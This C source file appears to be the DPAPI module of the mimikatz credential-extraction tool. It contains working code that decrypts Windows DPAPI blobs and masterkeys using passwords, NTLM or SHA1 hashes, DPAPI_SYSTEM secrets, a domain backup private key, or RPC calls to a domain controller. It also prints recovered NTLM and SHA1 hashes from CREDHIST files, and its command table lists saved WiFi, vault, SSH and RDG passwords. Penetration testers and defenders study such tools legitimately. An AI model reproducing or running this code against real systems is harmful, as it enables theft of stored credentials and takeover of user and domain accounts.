/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi.h"

const KUHL_M_C kuhl_m_c_dpapi[] = {
	{kuhl_m_dpapi_blob,			L"blob",		L"Describe a DPAPI blob, unprotect it with API or Masterkey"},
	{kuhl_m_dpapi_protect,		L"protect",		L"Protect a data via a DPAPI call"},
	{kuhl_m_dpapi_masterkey,	L"masterkey",	L"Describe a Masterkey file, unprotect each Masterkey (key depending)"},
	{kuhl_m_dpapi_credhist,		L"credhist",	L"Describe a Credhist file"},
	
	{kuhl_m_dpapi_keys_capi,	L"capi",		L"CAPI key test"},
	{kuhl_m_dpapi_keys_cng,		L"cng",			L"CNG key test"},
	{kuhl_m_dpapi_cred,			L"cred",		L"CRED test"},
	{kuhl_m_dpapi_vault,		L"vault",		L"VAULT test"},
	{kuhl_m_dpapi_wifi,			L"wifi",		L"WiFi test"},
	{kuhl_m_dpapi_wwan,			L"wwan",		L"Wwan test"},
#ifdef SQLITE3_OMIT
	{kuhl_m_dpapi_chrome,		L"chrome",		L"Chrome test"},
#endif
	{kuhl_m_dpapi_ssh,			L"ssh",		L"SSH Agent registry cache"},
	{kuhl_m_dpapi_rdg,			L"rdg",		L"RDG saved passwords"},
	{kuhl_m_dpapi_oe_cache,		L"cache", NULL},
};
const KUHL_M kuhl_m_dpapi = {
	L"dpapi",	L"DPAPI Module (by API or RAW access)", L"Data Protection application programming interface",
	ARRAYSIZE(kuhl_m_c_dpapi), kuhl_m_c_dpapi, NULL, kuhl_m_dpapi_oe_clean
};

NTSTATUS kuhl_m_dpapi_blob(int argc, wchar_t * argv[])
{
	DATA_BLOB dataIn, dataOut;
	PKULL_M_DPAPI_BLOB blob;
	PCWSTR outfile, infile;
	PWSTR description = NULL;

	if(kull_m_string_args_byName(argc, argv, L"in", &infile, NULL))
	{
		if(kull_m_file_readData(infile, &dataIn.pbData, &dataIn.cbData))
		{
			if(blob = kull_m_dpapi_blob_create(dataIn.pbData))
			{
				kull_m_dpapi_blob_descr(0, blob);

				if(kuhl_m_dpapi_unprotect_raw_or_blob(dataIn.pbData, dataIn.cbData, &description, argc, argv, NULL, 0, (LPVOID *) &dataOut.pbData, &dataOut.cbData, NULL))
				{
					if(description)
					{
						kprintf(L"description : %s\n", description);
						LocalFree(description);
					}

					if(kull_m_string_args_byName(argc, argv, L"out", &outfile, NULL))
					{
						if(kull_m_file_writeData(outfile, dataOut.pbData, dataOut.cbData))
							kprintf(L"Write to file \'%s\' is OK\n", outfile);
					}
					else
					{
						kprintf(L"data: ");
						kull_m_string_printSuspectUnicodeString(dataOut.pbData, dataOut.cbData);
						kprintf(L"\n");
					}
					LocalFree(dataOut.pbData);
				}
				kull_m_dpapi_blob_delete(blob);
			}
			LocalFree(dataIn.pbData);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dpapi_protect(int argc, wchar_t * argv[]) // no support for protecting with RAW masterkey at this time
{
	DATA_BLOB dataIn, dataOut, dataEntropy = {0, NULL};
	PKULL_M_DPAPI_BLOB blob;
	PCWSTR description = NULL, szEntropy, outfile;
	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT, NULL, MIMIKATZ}, *pPrompt;
	DWORD flags = 0, outputMode = 1;

	kull_m_string_args_byName(argc, argv, L"data", (PCWSTR *) &dataIn.pbData, MIMIKATZ);
	kull_m_string_args_byName(argc, argv, L"description", &description, NULL);
	if(kull_m_string_args_byName(argc, argv, L"entropy", &szEntropy, NULL))
		kull_m_string_stringToHexBuffer(szEntropy, &dataEntropy.pbData, &dataEntropy.cbData);
	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		flags |= CRYPTPROTECT_LOCAL_MACHINE;
	if(kull_m_string_args_byName(argc, argv, L"system", NULL, NULL))
		flags |= CRYPTPROTECT_SYSTEM;
	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;
	
	if(kull_m_string_args_byName(argc, argv, L"c", NULL, NULL))
		outputMode = 2;

	kprintf(L"\ndata        : %s\n", dataIn.pbData);
	kprintf(L"description : %s\n", description ? description : L"");
	kprintf(L"flags       : "); kull_m_dpapi_displayProtectionFlags(flags); kprintf(L"\n");
	kprintf(L"prompt flags: "); if(pPrompt) kull_m_dpapi_displayPromptFlags(pPrompt->dwPromptFlags); kprintf(L"\n");
	kprintf(L"entropy     : "); kull_m_string_wprintf_hex(dataEntropy.pbData, dataEntropy.cbData, 0); kprintf(L"\n\n");

	dataIn.cbData = (DWORD) ((wcslen((PCWSTR) dataIn.pbData) + 1) * sizeof(wchar_t));
	if(CryptProtectData(&dataIn, description, &dataEntropy, NULL, pPrompt, flags, &dataOut))
	{
		if(blob = kull_m_dpapi_blob_create(dataOut.pbData))
		{
			kull_m_dpapi_blob_descr(0, blob);
			kull_m_dpapi_blob_delete(blob);
		}
		kprintf(L"\n");
		if(kull_m_string_args_byName(argc, argv, L"out", &outfile, NULL))
		{
			if(kull_m_file_writeData(outfile, dataOut.pbData, dataOut.cbData))
				kprintf(L"Write to file \'%s\' is OK\n", outfile);
		}
		else
		{
			kprintf(L"Blob:\n");
			kull_m_string_wprintf_hex(dataOut.pbData, dataOut.cbData, outputMode | (16 << 16));
			kprintf(L"\n");
		}
		LocalFree(dataOut.pbData);
	}
	else PRINT_ERROR_AUTO(L"CryptProtectData");

	if(dataEntropy.pbData)
		LocalFree(dataEntropy.pbData);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dpapi_masterkey(int argc, wchar_t * argv[])
{
	PKULL_M_DPAPI_MASTERKEYS masterkeys;
	PBYTE buffer, pHash = NULL, pSystem = NULL;
	PVOID output, derivedKey;
	PPVK_FILE_HDR pvkBuffer;
	DWORD szBuffer, szPvkBuffer, cbHash = 0, cbSystem = 0, cbSystemOffset = 0, cbOutput;
	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
	LPCWSTR szIn = NULL, szSid = NULL, szPassword = NULL, szHash = NULL, szSystem = NULL, szDomainpvk = NULL, szDomain = NULL, szDc = NULL;
	LPWSTR convertedSid = NULL, szTmpDc = NULL;
	PSID pSid;
	PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY pCredentialEntry = NULL;
	PKUHL_M_DPAPI_OE_DOMAINKEY_ENTRY pDomainKeyEntry = NULL;
	UNICODE_STRING uGuid;
	GUID guid;
	BOOL isProtected = kull_m_string_args_byName(argc, argv, L"protected", NULL, NULL), statusGuid = FALSE;

	if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
	{
		if(kull_m_file_readData(szIn, &buffer, &szBuffer))
		{
			if(masterkeys = kull_m_dpapi_masterkeys_create(buffer))
			{
				kull_m_dpapi_masterkeys_descr(0, masterkeys);

				uGuid.Length = uGuid.MaximumLength = sizeof(masterkeys->szGuid) + (2 * sizeof(wchar_t));
				if(uGuid.Buffer = (PWSTR) LocalAlloc(LPTR, uGuid.MaximumLength))
				{
					uGuid.Buffer[0] = L'{';
					RtlCopyMemory(uGuid.Buffer + 1, masterkeys->szGuid, sizeof(masterkeys->szGuid));
					uGuid.Buffer[(uGuid.Length >> 1) - 1] = L'}';
					statusGuid = NT_SUCCESS(RtlGUIDFromString(&uGuid, &guid));
					LocalFree(uGuid.Buffer);
				}

				if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
				{
					if(ConvertStringSidToSid(szSid, &pSid))
					{
						ConvertSidToStringSid(pSid, &convertedSid);
						LocalFree(pSid);
					}
					else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
				}
				else kuhl_m_dpapi_oe_autosid(szIn, &convertedSid);

				if(kull_m_string_args_byName(argc, argv, L"hash", &szHash, NULL))
					kull_m_string_stringToHexBuffer(szHash, &pHash, &cbHash);
				if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
					kull_m_string_stringToHexBuffer(szSystem, &pSystem, &cbSystem);

				if(masterkeys->MasterKey && masterkeys->dwMasterKeyLen)
				{
					if(masterkeys->CredHist)
						pCredentialEntry = kuhl_m_dpapi_oe_credential_get(NULL, &masterkeys->CredHist->guid);
					if(!pCredentialEntry && convertedSid)
						pCredentialEntry = kuhl_m_dpapi_oe_credential_get(convertedSid, NULL);
					if(pCredentialEntry)
					{
						kprintf(L"\n[masterkey] with volatile cache: "); kuhl_m_dpapi_oe_credential_descr(pCredentialEntry);
						if(masterkeys->dwFlags & 4)
						{
							if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1)
								derivedKey = pCredentialEntry->data.sha1hashDerived;
						}
						else
						{
							if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_MD4)
								derivedKey = pCredentialEntry->data.md4hashDerived;
						}
						if(derivedKey)
						{
							if(kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey(masterkeys->MasterKey, derivedKey, SHA_DIGEST_LENGTH, &output, &cbOutput))
							{
								if(masterkeys->CredHist)
									kuhl_m_dpapi_oe_credential_copyEntryWithNewGuid(pCredentialEntry, &masterkeys->CredHist->guid);
								kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
							}
						}
						else PRINT_ERROR(L"No suitable key found in cache\n");
					}
					
					if(masterkeys->dwFlags & 2)
					{
						if(pSystem && cbSystem)
						{
							if(cbSystem == 2 * SHA_DIGEST_LENGTH + sizeof(DWORD))
								cbSystemOffset = sizeof(DWORD);

							if((cbSystem - cbSystemOffset) == 2 * SHA_DIGEST_LENGTH)
							{
								kprintf(L"\n[masterkey] with DPAPI_SYSTEM (machine, then user): "); kull_m_string_wprintf_hex(pSystem + cbSystemOffset, 2 * SHA_DIGEST_LENGTH, 0); kprintf(L"\n");
								if(kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey(masterkeys->MasterKey, pSystem + cbSystemOffset, SHA_DIGEST_LENGTH, &output, &cbOutput))
								{
									kprintf(L"** MACHINE **\n");
									kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
								}
								else if(kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey(masterkeys->MasterKey, pSystem + cbSystemOffset + SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH, &output, &cbOutput))
								{
									kprintf(L"** USER **\n");
									kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
								}
								else PRINT_ERROR(L"kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey\n");
							}
							else
							{
								kprintf(L"\n[masterkey] with DPAPI_SYSTEM: "); kull_m_string_wprintf_hex(pSystem + cbSystemOffset, cbSystem - cbSystemOffset, 0); kprintf(L"\n");
								if(kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey(masterkeys->MasterKey, pSystem + cbSystemOffset, cbSystem - cbSystemOffset, &output, &cbOutput))
									kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
								else PRINT_ERROR(L"kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey\n");
							}
						}
					}
					else if(convertedSid)
					{
						if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
						{
							kprintf(L"\n[masterkey] with password: %s (%s user)\n", szPassword, isProtected ? L"protected" : L"normal");
							if(kull_m_dpapi_unprotect_masterkey_with_password(masterkeys->dwFlags, masterkeys->MasterKey, szPassword, convertedSid, isProtected, &output, &cbOutput))
							{
								kuhl_m_dpapi_oe_credential_add(convertedSid, masterkeys->CredHist ? &masterkeys->CredHist->guid : NULL, NULL, NULL, NULL, szPassword);
								kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
							}
							else PRINT_ERROR(L"kull_m_dpapi_unprotect_masterkey_with_password\n");
						}
						if(pHash)
						{
							kprintf(L"\n[masterkey] with hash: "); kull_m_string_wprintf_hex(pHash, cbHash, 0);
							if(cbHash == LM_NTLM_HASH_LENGTH)
								kprintf(L" (ntlm type)\n");
							else if(cbHash == SHA_DIGEST_LENGTH)
								kprintf(L" (sha1 type)\n");
							else 
								kprintf(L" (?)\n");

							if(kull_m_dpapi_unprotect_masterkey_with_userHash(masterkeys->MasterKey, pHash, cbHash, convertedSid, &output, &cbOutput))
							{
								kuhl_m_dpapi_oe_credential_add(convertedSid, masterkeys->CredHist ? &masterkeys->CredHist->guid : NULL, (cbHash == LM_NTLM_HASH_LENGTH) ? pHash : NULL, (cbHash == SHA_DIGEST_LENGTH) ? pHash : NULL, NULL, szPassword);
								kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
							}
							else PRINT_ERROR(L"kull_m_dpapi_unprotect_masterkey_with_userHash\n");
						}
					}
				}
				
				//if(masterkeys->BackupKey && masterkeys->dwBackupKeyLen && convertedSid && (!(masterkeys->dwFlags & 1) || (pSystem && cbSystem)))
				//{
				//	kprintf(L"\n[backupkey] %s DPAPI_SYSTEM: ", pSystem ? L"with" : L"without");
				//	if(pSystem)
				//	{
				//		kull_m_string_wprintf_hex(pSystem, cbSystem, 0);
				//		if(!(masterkeys->dwFlags & 1))
				//			kprintf(L" (but is not needed)");
				//	}
				//	kprintf(L"\n");
				//	if(kull_m_dpapi_unprotect_backupkey_with_secret(masterkeys->dwFlags, masterkeys->BackupKey, convertedSid, pSystem, cbSystem, &output, &cbOutput))
				//		kuhl_m_dpapi_display_MasterkeyInfosAndFree(NULL, output, cbOutput, NULL);
				//	else PRINT_ERROR(L"kull_m_dpapi_unprotect_backupkey_with_secret\n");
				//}

				if(masterkeys->DomainKey && masterkeys->dwDomainKeyLen)
				{
					if(pDomainKeyEntry = kuhl_m_dpapi_oe_domainkey_get(&masterkeys->DomainKey->guidMasterKey))
					{
						kprintf(L"\n[domainkey] with volatile cache: "); kuhl_m_dpapi_oe_domainkey_descr(pDomainKeyEntry);
						if(kull_m_dpapi_unprotect_domainkey_with_key(masterkeys->DomainKey, pDomainKeyEntry->data.key, pDomainKeyEntry->data.keyLen, &output, &cbOutput, &pSid))
							kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, pSid);
						else PRINT_ERROR(L"kull_m_dpapi_unprotect_domainkey_with_key\n");
					}

					if(kull_m_string_args_byName(argc, argv, L"pvk", &szDomainpvk, NULL))
					{
						kprintf(L"\n[domainkey] with RSA private key\n");
						if(kull_m_file_readData(szDomainpvk, (PBYTE *) &pvkBuffer, &szPvkBuffer))
						{
							if(kull_m_dpapi_unprotect_domainkey_with_key(masterkeys->DomainKey, (PBYTE) pvkBuffer + sizeof(PVK_FILE_HDR), pvkBuffer->cbPvk, &output, &cbOutput, &pSid))
							{
								kuhl_m_dpapi_oe_domainkey_add(&masterkeys->DomainKey->guidMasterKey, (PBYTE) pvkBuffer + sizeof(PVK_FILE_HDR), pvkBuffer->cbPvk, TRUE);
								kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, pSid);
							}
							else PRINT_ERROR(L"kull_m_dpapi_unprotect_domainkey_with_key\n");
							LocalFree(pvkBuffer);
						}
					}

					if(kull_m_string_args_byName(argc, argv, L"rpc", NULL, NULL))
					{
						kprintf(L"\n[domainkey] with RPC\n");

						if(!(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) || kull_m_string_args_byName(argc, argv, L"system", &szDc, NULL)))
						{
							if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
								if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
									szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;
							if(szDomain && wcschr(szDomain, L'.'))
							{
								kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
								if(kull_m_net_getDC(szDomain, DS_WRITABLE_REQUIRED, &szTmpDc))
									szDc = szTmpDc;
							}
							else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");
						}

						if(szDc)
						{
							kprintf(L"[DC] \'%s\' will be the DC server\n", szDc);
							if(kull_m_dpapi_unprotect_domainkey_with_rpc(masterkeys, buffer, szDc, &output, &cbOutput))
								kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
						}
						else PRINT_ERROR(L"Domain Controller not present\n");

						if(szTmpDc)
							LocalFree(szTmpDc);
						if(pPolicyDnsDomainInfo)
							LsaFreeMemory(pPolicyDnsDomainInfo);
					}
				}

				if(convertedSid)
					LocalFree(convertedSid);
				if(pHash)
					LocalFree(pHash);
				if(pSystem)
					LocalFree(pSystem);

				kull_m_dpapi_masterkeys_delete(masterkeys);
			}
			LocalFree(buffer);
		}
	}
	else PRINT_ERROR(L"Input masterkeys file needed (/in:file)\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dpapi_credhist(int argc, wchar_t * argv[])
{
	PBYTE buffer;
	DWORD szBuffer, i;
	LPCWSTR szIn = NULL, szSid = NULL, szHash = NULL, szPassword = NULL;
	PWSTR convertedSid = NULL;
	PSID pSid = NULL, prevSid = NULL;
	LPCGUID prevGuid;
	PKULL_M_DPAPI_CREDHIST credhist;
	PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY pCredentialEntry = NULL;
	BYTE passwordHash[SHA_DIGEST_LENGTH], derivedkey[SHA_DIGEST_LENGTH], sha1[SHA_DIGEST_LENGTH], ntlm[LM_NTLM_HASH_LENGTH];
	BOOL hashOk = FALSE;

	if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
	{
		if(kull_m_file_readData(szIn, &buffer, &szBuffer))
		{
			if(credhist = kull_m_dpapi_credhist_create(buffer, szBuffer))
			{
				kull_m_dpapi_credhist_descr(0, credhist);

				if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
				{
					if(ConvertStringSidToSid(szSid, &pSid))
						prevSid = pSid;
					else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
				}
				
				if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
					hashOk = kull_m_crypto_hash(CALG_SHA1, szPassword, (DWORD) wcslen(szPassword) * sizeof(wchar_t), passwordHash, sizeof(passwordHash));
				else if(kull_m_string_args_byName(argc, argv, L"sha1", &szHash, NULL))
					hashOk = kull_m_string_stringToHex(szHash, passwordHash, sizeof(passwordHash));

				prevGuid = &credhist->current.guid;
				if(!prevSid && credhist->__dwCount)
					prevSid = credhist->entries[0]->pSid;

				for(i = 0; prevSid && (i < credhist->__dwCount); i++)
				{
					if(ConvertSidToStringSid(prevSid, &convertedSid))
					{
						pCredentialEntry = kuhl_m_dpapi_oe_credential_get(NULL, prevGuid);
						if(!pCredentialEntry)
							pCredentialEntry = kuhl_m_dpapi_oe_credential_get(convertedSid, NULL);
						if(pCredentialEntry && (pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1))
						{
							kprintf(L"\n  [entry %u] with volatile cache: ", i); kuhl_m_dpapi_oe_credential_descr(pCredentialEntry);
							if(kull_m_dpapi_unprotect_credhist_entry_with_shaDerivedkey(credhist->entries[i], pCredentialEntry->data.sha1hashDerived, sizeof(pCredentialEntry->data.sha1hashDerived), ntlm, sha1))
							{
								kuhl_m_dpapi_oe_credential_copyEntryWithNewGuid(pCredentialEntry, prevGuid);
								kuhl_m_dpapi_display_CredHist(credhist->entries[i], ntlm, sha1);
							}
						}
						else if(hashOk)
						{
							kprintf(L"\n  [entry %u] with SHA1 and SID: ", i); kull_m_string_wprintf_hex(passwordHash, sizeof(passwordHash), 0); kprintf(L"\n");
							if(kull_m_crypto_hmac(CALG_SHA1, passwordHash, sizeof(passwordHash), convertedSid, (DWORD) (wcslen(convertedSid) + 1) * sizeof(wchar_t), derivedkey, sizeof(derivedkey)))
								if(kull_m_dpapi_unprotect_credhist_entry_with_shaDerivedkey(credhist->entries[i], derivedkey, sizeof(derivedkey), ntlm, sha1))
								{
									kuhl_m_dpapi_oe_credential_add(convertedSid, prevGuid, NULL, passwordHash, NULL, szPassword);
									kuhl_m_dpapi_display_CredHist(credhist->entries[i], ntlm, sha1);
								}
						}
						LocalFree(convertedSid);
					}
					prevGuid = &credhist->entries[i]->header.guid;
					prevSid = credhist->entries[i]->pSid;
				}

				if(pSid)
					LocalFree(pSid);
				
				kull_m_dpapi_credhist_delete(credhist);
			}
			LocalFree(buffer);
		}
	}
	else PRINT_ERROR(L"Input credhist file needed (/in:file)\n");
	return STATUS_SUCCESS;
}

BOOL kuhl_m_dpapi_unprotect_raw_or_blob(LPCVOID pDataIn, DWORD dwDataInLen, LPWSTR *ppszDataDescr, int argc, wchar_t * argv[], LPCVOID pOptionalEntropy, DWORD dwOptionalEntropyLen, LPVOID *pDataOut, DWORD *dwDataOutLen, LPCWSTR pText)
{
	BOOL status = FALSE;
	PCWSTR szEntropy, szMasterkey, szPassword = NULL;
	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT | CRYPTPROTECT_PROMPT_ON_UNPROTECT | CRYPTPROTECT_PROMPT_STRONG, NULL, MIMIKATZ}, *pPrompt;

	PBYTE masterkey = NULL, entropy = NULL;
	DWORD masterkeyLen = 0, entropyLen = 0, flags = 0;
	PKULL_M_DPAPI_BLOB blob;
	PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY entry = NULL;
	BOOL isNormalAPI = kull_m_string_args_byName(argc, argv, L"unprotect", NULL, NULL);

	if(kull_m_string_args_byName(argc, argv, L"masterkey", &szMasterkey, NULL))
		kull_m_string_stringToHexBuffer(szMasterkey, &masterkey, &masterkeyLen);
	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
	if(kull_m_string_args_byName(argc, argv, L"entropy", &szEntropy, NULL))
		kull_m_string_stringToHexBuffer(szEntropy, &entropy, &entropyLen);
	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;

	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		flags |= CRYPTPROTECT_LOCAL_MACHINE;

	if(blob = kull_m_dpapi_blob_create(pDataIn))
	{
		entry = kuhl_m_dpapi_oe_masterkey_get(&blob->guidMasterKey);
		if(entry || (masterkey && masterkeyLen) || isNormalAPI)
		{
			if(pText)
				kprintf(L"%s", pText);

			if(isNormalAPI)
			{
				kprintf(L" * using CryptUnprotectData API\n");
			}
			
			if(entry)
			{
				kprintf(L" * volatile cache: ");
				kuhl_m_dpapi_oe_masterkey_descr(entry);
			}
			if(masterkey)
			{
				kprintf(L" * masterkey     : ");
				kull_m_string_wprintf_hex(masterkey, masterkeyLen, 0);
				kprintf(L"\n");
			}
			if(pPrompt)
			{
				kprintf(L" > prompt flags  : ");
				kull_m_dpapi_displayPromptFlags(pPrompt->dwPromptFlags);
				kprintf(L"\n");
			}
			else flags |= CRYPTPROTECT_UI_FORBIDDEN;
			if(entropy)
			{
				kprintf(L" > entropy       : ");
				kull_m_string_wprintf_hex(entropy, entropyLen, 0);
				kprintf(L"\n");
			}
			if(szPassword)
				kprintf(L" > password      : %s\n", szPassword);

			if(entry)
				status = kull_m_dpapi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, NULL, 0, pDataOut, dwDataOutLen, entry->data.keyHash, sizeof(entry->data.keyHash), szPassword);

			if(!status && ((masterkey && masterkeyLen) || isNormalAPI))
			{
				status = kull_m_dpapi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, pPrompt, flags, pDataOut, dwDataOutLen, masterkey, masterkeyLen, szPassword);
				if(status && masterkey && masterkeyLen)
					kuhl_m_dpapi_oe_masterkey_add(&blob->guidMasterKey, masterkey, masterkeyLen);

				if(!status && !masterkey)
				{
					if(GetLastError() == NTE_BAD_KEY_STATE)
					{
						PRINT_ERROR(L"NTE_BAD_KEY_STATE, needed Masterkey is: ");
						kull_m_string_displayGUID(&blob->guidMasterKey);
						kprintf(L"\n");
					}
					else PRINT_ERROR_AUTO(L"CryptUnprotectData");
				}
			}
			//kprintf(L"\n");
		}
		kull_m_dpapi_blob_delete(blob);
	}

	if(entropy)
		LocalFree(entropy);
	if(masterkey)
		LocalFree(masterkey);
	return status;
}

void kuhl_m_dpapi_display_MasterkeyInfosAndFree(LPCGUID guid, PVOID data, DWORD dataLen, PSID sid)
{
	BYTE digest[SHA_DIGEST_LENGTH];
	
	kprintf(L"  key : ");
	kull_m_string_wprintf_hex(data, dataLen, 0);
	kprintf(L"\n");
	if(kull_m_crypto_hash(CALG_SHA1, data, dataLen, digest, sizeof(digest)))
	{
		kprintf(L"  sha1: ");
		kull_m_string_wprintf_hex(digest, sizeof(digest), 0);
		kprintf(L"\n");
		if(guid)
			kuhl_m_dpapi_oe_masterkey_add(guid, digest, sizeof(digest));
	}
	LocalFree(data);
	if(sid)
	{
		kprintf(L"  sid : ");
		kull_m_string_displaySID(sid);
		kprintf(L"\n");
		LocalFree(sid);
	}
}

void kuhl_m_dpapi_display_CredHist(PKULL_M_DPAPI_CREDHIST_ENTRY entry, LPCVOID ntlm, LPCVOID sha1)
{
	PWSTR currentStringSid;
	kprintf(L"   "); kull_m_string_displaySID(entry->pSid); kprintf(L" -- "); kull_m_string_displayGUID(&entry->header.guid); kprintf(L"\n");
	kprintf(L"   > NTLM: "); kull_m_string_wprintf_hex(ntlm, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
	kprintf(L"   > SHA1: "); kull_m_string_wprintf_hex(sha1, SHA_DIGEST_LENGTH, 0); kprintf(L"\n");
	if(ConvertSidToStringSid(entry->pSid, &currentStringSid))
	{
		kuhl_m_dpapi_oe_credential_add(currentStringSid, &entry->header.guid, ntlm, sha1, NULL, NULL);
		LocalFree(currentStringSid);
	}
}